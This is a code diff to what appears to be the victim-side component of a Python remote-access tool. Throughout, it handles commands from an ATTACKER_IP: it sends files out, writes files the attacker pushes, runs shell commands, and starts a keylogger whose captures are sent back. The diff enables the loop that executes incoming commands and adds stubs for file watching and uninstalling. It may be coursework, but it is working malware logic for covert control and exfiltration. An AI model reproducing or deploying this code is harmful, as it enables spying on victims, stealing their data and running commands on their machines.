@@ -12,18 +12,9 @@ from mods.protocol import send_data, receive_data, send_ack_packet
 from mods.knocking import wait_for_knock
 from mods.keylogger import start_keylogger, stop_keylogger
 from mods.monitoring import start_watching
-
-def build_parser() -> argparse.ArgumentParser:
-    p = argparse.ArgumentParser(description="Extract and decrypt a message hidden in a PNG.")
-    p.add_argument("--host", default="0.0.0.0")
-    p.add_argument("--port", type=int, required=True)
-    p.add_argument("--max-bytes", type=int, default=2048)
-    return p
+from mods.shared import ATTACKER_IP, VICTIM_IP
 
 SAVE_DIR = 'data_victim/'
-
-
-ATTACKER_IP = '127.0.0.1'
 
 def run_shell_command(args) -> str:
     print(f'Running... {args}')
@@ -36,8 +27,8 @@ def run_shell_command(args) -> str:
 def handle_command(cmd: str, args: list[str]) -> str:
     if cmd == 'sf':
         filename = args[0]
-        send_ack_packet(ATTACKER_IP)
-        file_bytes = receive_data()
+        send_ack_packet(src=VICTIM_IP, dst=ATTACKER_IP)
+        file_bytes = receive_data(from_ip=ATTACKER_IP)
         with open(f'data_victim/{filename}', 'wb') as f:
             f.write(file_bytes)
         return f'Downloaded file {filename}'
@@ -46,9 +37,9 @@ def handle_command(cmd: str, args: list[str]) -> str:
         filepath = Path(raw_path)
         if not filepath.is_file():
             return 'Unable to find the file'
-        send_ack_packet(ATTACKER_IP)
+        send_ack_packet(src=VICTIM_IP, dst=ATTACKER_IP)
         file_bytes = filepath.read_bytes()
-        send_data(file_bytes, ATTACKER_IP)
+        send_data(file_bytes, src=VICTIM_IP, dst=ATTACKER_IP)
         return f'Sent file {filepath.name}'
     elif cmd == 'rn':
         result = run_shell_command(args)
@@ -57,12 +48,24 @@ def handle_command(cmd: str, args: list[str]) -> str:
         return f'Ran command {args}'
     elif cmd == 'k+':
         result = start_keylogger()
-        send_data(result.encode(), ATTACKER_IP)
+        send_data(result.encode(), src=VICTIM_IP, dst=ATTACKER_IP)
         return 'Keylogger started'
     elif cmd == 'k-':
         result = stop_keylogger()
-        send_data(result.encode(), ATTACKER_IP)
+        send_data(result.encode(), src=VICTIM_IP, dst=ATTACKER_IP)
         return f'Keylogger stopped'
+    elif cmd == 'wf':
+        # TODO: Use watchdog to monitor this file and send results back to the attacker
+        return f'Watching file: {args[0]}'
+    elif cmd == 'wd':
+        # TODO: Use watchdog to monitor this dir and send results back to the attacker
+        return f'Watching directory: {args[0]}'
+    elif cmd == 'dc':
+        # TODO: Gracefully disconnect and end the session
+        return 'Disconnected'
+    elif cmd == 'un':
+        # TODO: Remove 
+        return 'Uninstalled'
     else:
         return 'Unrecognized command'
 
@@ -78,14 +81,15 @@ def main():
     # print(f'knocking success from {attacker_ip}')
     # send_ack_packet(attacker_ip)
 
-    # while True:
-    #     command = receive_data(timeout=360)
-    #     decoded = command.decode()
-    #     print(f'Received: {decoded}')
-    #     parts = decoded.split(' ')
-    #     res = handle_command(parts[0], parts[1:])
-    #     print(res)
-    start_watching('test/')
+    while True:
+        command = receive_data(from_ip=ATTACKER_IP, timeout=360)
+        decoded = command.decode()
+        print(f'Received: {decoded}')
+        parts = decoded.split(' ')
+        res = handle_command(parts[0], parts[1:])
+        print(res)
+    
+    # start_watching('test/')
 
  
 if __name__ == "__main__":
